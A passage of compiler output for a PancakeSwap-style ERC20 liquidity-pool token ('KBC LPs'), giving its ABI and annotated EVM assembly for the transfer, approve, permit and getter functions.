									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "decimals",
							"outputs": [
								{
									"internalType": "uint8",
									"name": "",
									"type": "uint8"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "name",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "nonces",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "deadline",
									"type": "uint256"
								},
								{
									"internalType": "uint8",
									"name": "v",
									"type": "uint8"
								},
								{
									"internalType": "bytes32",
									"name": "r",
									"type": "bytes32"
								},
								{
									"internalType": "bytes32",
									"name": "s",
									"type": "bytes32"
								}
							],
							"name": "permit",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "symbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":139:4483  contract PancakeERC20 is IPancakeERC20 {... */\n  mstore(0x40, 0x80)\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1059:1544  constructor() public {... */\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n  pop\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1245:1378  keccak256(... */\n  mload(0x40)\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1149:1156  chainid */\n  chainid\n  swap1\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1245:1378  keccak256(... */\n  dup1\n  0x52\n  data_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f\n  dup3\n  codecopy\n  0x40\n  dup1\n  mload\n  swap2\n  dup3\n  swap1\n  sub\n  0x52\n  add\n  dup3\n  keccak256\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1412:1416  name */\n  dup3\n  dup3\n  add\n  dup3\n  mstore\n  0x07\n  dup4\n  mstore\n  shl(0xc8, 0x4b4243204c5073)\n  0x20\n  swap4\n  dup5\n  add\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1446:1456  bytes(\"1\") */\n  dup2\n  mload\n  dup1\n  dup4\n  add\n  dup4\n  mstore\n  0x01\n  dup2\n  mstore\n  shl(0xf8, 0x31)\n  swap1\n  dup5\n  add\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  dup2\n  mload\n  dup1\n  dup5\n  add\n  swap2\n  swap1\n  swap2\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1396:1418  keccak256(bytes(name)) */\n  0x6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  dup2\n  dup4\n  add\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1436:1457  keccak256(bytes(\"1\")) */\n  0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  0x60\n  dup3\n  add\n  mstore\n  0x80\n  dup2\n  add\n  swap5\n  swap1\n  swap5\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1508:1512  this */\n  address\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  0xa0\n  dup1\n  dup7\n  add\n  swap2\n  swap1\n  swap2\n  mstore\n  dup2\n  mload\n    /* \"--CODEGEN--\":26:47   */\n  dup1\n  dup7\n  sub\n    /* \"--CODEGEN--\":22:54   */\n  swap1\n  swap2\n  add\n    /* \"--CODEGEN--\":6:55   */\n  dup2\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  0xc0\n  swap1\n  swap5\n  add\n  swap1\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1194:1537  keccak256(... */\n  dup3\n  mload\n  swap3\n  add\n  swap2\n  swap1\n  swap2\n  keccak256\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1175:1191  DOMAIN_SEPARATOR */\n  0x04\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1175:1537  DOMAIN_SEPARATOR = keccak256(... */\n  sstore\n  pop\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":139:4483  contract PancakeERC20 is IPancakeERC20 {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\ndata_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f 454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429\n\nsub_0: assembly {\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":139:4483  contract PancakeERC20 is IPancakeERC20 {... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_1:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":139:4483  contract PancakeERC20 is IPancakeERC20 {... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x47d5d856\n      gt\n      tag_17\n      jumpi\n      dup1\n      0x95d89b41\n      gt\n      tag_18\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_13\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_14\n      jumpi\n      dup1\n      0xd505accf\n      eq\n      tag_15\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_16\n      jumpi\n      jump(tag_2)\n    tag_18:\n      dup1\n      0x47d5d856\n      eq\n      tag_10\n      jumpi\n      dup1\n      0x70a08231\n      eq\n      tag_11\n      jumpi\n      dup1\n      0x7ecebe00\n      eq\n      tag_12\n      jumpi\n      jump(tag_2)\n    tag_17:\n      dup1\n      0x23b872dd\n      gt\n      tag_19\n      jumpi\n      dup1\n      0x23b872dd\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x30adf81f\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x313ce567\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x3644e515\n      eq\n      tag_9\n      jumpi\n      jump(tag_2)\n    tag_19:\n      dup1\n      0x06fdde03\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x095ea7b3\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":217:256  string public constant name = \"KBC LPs\" */\n    tag_3:\n      tag_20\n      tag_21\n      jump\t// in\n    tag_20:\n      0x40\n      dup1\n      mload\n      0x20\n      dup1\n      dup3\n      mstore\n      dup4\n      mload\n      dup2\n      dup4\n      add\n      mstore\n      dup4\n      mload\n      swap2\n      swap3\n      dup4\n      swap3\n      swap1\n      dup4\n      add\n      swap2\n      dup6\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_22:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_24\n      jumpi\n        /* \"--CODEGEN--\":90:101   */\n      dup2\n      dup2\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":71:82   */\n      dup4\n      dup3\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_22)\n    tag_24:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":217:256  string public constant name = \"KBC LPs\" */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_25\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_25:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2852:2999  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_4:\n      tag_26\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_27\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_27:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2852:2999  function approve(address spender, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_28\n      jump\t// in\n    tag_26:\n      0x40\n      dup1\n      mload\n      swap2\n      iszero\n      iszero\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":349:375  uint256 public totalSupply */\n    tag_5:\n      tag_29\n      tag_30\n      jump\t// in\n    tag_29:\n      0x40\n      dup1\n      mload\n      swap2\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3150:3511  function transferFrom(... */\n    tag_6:\n      tag_26\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x60\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_32\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_32:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3150:3511  function transferFrom(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      add\n      calldataload\n      tag_33\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":698:814  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_7:\n      tag_29\n      tag_35\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":308:343  uint8 public constant decimals = 18 */\n    tag_8:\n      tag_36\n      tag_37\n      jump\t// in\n    tag_36:\n      0x40\n      dup1\n      mload\n      0xff\n      swap1\n      swap3\n      and\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":557:588  bytes32 public DOMAIN_SEPARATOR */\n    tag_9:\n      tag_29\n      tag_39\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":501:550  mapping(address => uint256) public _frozenBalance */\n    tag_10:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_41\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_41:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":501:550  mapping(address => uint256) public _frozenBalance */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_42\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":381:425  mapping(address => uint256) public balanceOf */\n    tag_11:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_44\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_44:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":381:425  mapping(address => uint256) public balanceOf */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_45\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":820:861  mapping(address => uint256) public nonces */\n    tag_12:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_47\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_47:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":820:861  mapping(address => uint256) public nonces */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_48\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":262:302  string public constant symbol = \"KBC-LP\" */\n    tag_13:\n      tag_20\n      tag_50\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3005:3144  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_14:\n      tag_26\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_56\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_56:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3005:3144  function transfer(address to, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_57\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3517:4481  function permit(... */\n    tag_15:\n      tag_58\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:16   */\n      0xe0\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:17   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_59\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_59:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3517:4481  function permit(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      dup2\n      add\n      calldataload\n      swap1\n      0x60\n      dup2\n      add\n      calldataload\n      swap1\n      0xff\n      0x80\n      dup3\n      add\n      calldataload\n      and\n      swap1\n      0xa0\n      dup2\n      add\n      calldataload\n      swap1\n      0xc0\n      add\n      calldataload\n      tag_60\n      jump\t// in\n    tag_58:\n      stop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":431:495  mapping(address => mapping(address => uint256)) public allowance */\n    tag_16:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_62\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_62:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":431:495  mapping(address => mapping(address => uint256)) public allowance */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      add\n      calldataload\n      and\n      tag_63\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":217:256  string public constant name = \"KBC LPs\" */\n    tag_21:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x07\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xc8, 0x4b4243204c5073)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2852:2999  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_28:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2919:2923  bool */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2935:2971  _approve(msg.sender, spender, value) */\n      tag_65\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2944:2954  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2956:2963  spender */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2965:2970  value */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2935:2943  _approve */\n      tag_66\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2935:2971  _approve(msg.sender, spender, value) */\n      jump\t// in\n    tag_65:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2988:2992  true */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2852:2999  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_64:\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":349:375  uint256 public totalSupply */\n    tag_30:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3150:3511  function transferFrom(... */\n    tag_33:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3296  allowance[from] */\n      dup4\n      and\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3261:3265  bool */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3296  allowance[from] */\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3290  allowance */\n      0x02\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3296  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3297:3307  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3308  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      dup2\n      keccak256\n      sload\n      not(0x00)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3323  allowance[from][msg.sender] != uint256(-1) */\n      eq\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3277:3448  if (allowance[from][msg.sender] != uint256(-1)) {... */\n      tag_68\n      jumpi\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3384  allowance[from] */\n      dup5\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3378  allowance */\n      0x02\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3384  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3385:3395  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3396  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3437  allowance[from][msg.sender].sub(... */\n      tag_69\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3418:3423  value */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3437  allowance[from][msg.sender].sub(... */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3400  allowance[from][msg.sender].sub */\n      tag_70\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3437  allowance[from][msg.sender].sub(... */\n      and\n      jump\t// in\n    tag_69:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3354  allowance[from] */\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3348  allowance */\n      0x02\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3354  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3355:3365  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3366  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3437  allowance[from][msg.sender] = allowance[from][msg.sender].sub(... */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3277:3448  if (allowance[from][msg.sender] != uint256(-1)) {... */\n    tag_68:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3457:3483  _transfer(from, to, value) */\n      tag_71\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3467:3471  from */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3473:3475  to */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3477:3482  value */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3457:3466  _transfer */\n      tag_72\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3457:3483  _transfer(from, to, value) */\n      jump\t// in\n    tag_71:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3500:3504  true */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3150:3511  function transferFrom(... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":698:814  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_35:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":748:814  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":698:814  bytes32 public constant PERMIT_TYPEHASH =... */\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":308:343  uint8 public constant decimals = 18 */\n    tag_37:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":341:343  18 */\n      0x12\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":308:343  uint8 public constant decimals = 18 */\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":557:588  bytes32 public DOMAIN_SEPARATOR */\n    tag_39:\n      sload(0x04)\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":501:550  mapping(address => uint256) public _frozenBalance */\n    tag_42:\n      mstore(0x20, 0x03)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":381:425  mapping(address => uint256) public balanceOf */\n    tag_45:\n      mstore(0x20, 0x01)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":820:861  mapping(address => uint256) public nonces */\n    tag_48:\n      mstore(0x20, 0x05)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":262:302  string public constant symbol = \"KBC-LP\" */\n    tag_50:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x06\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xd4, 0x04b42432d4c5)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3005:3144  function transfer(address to, 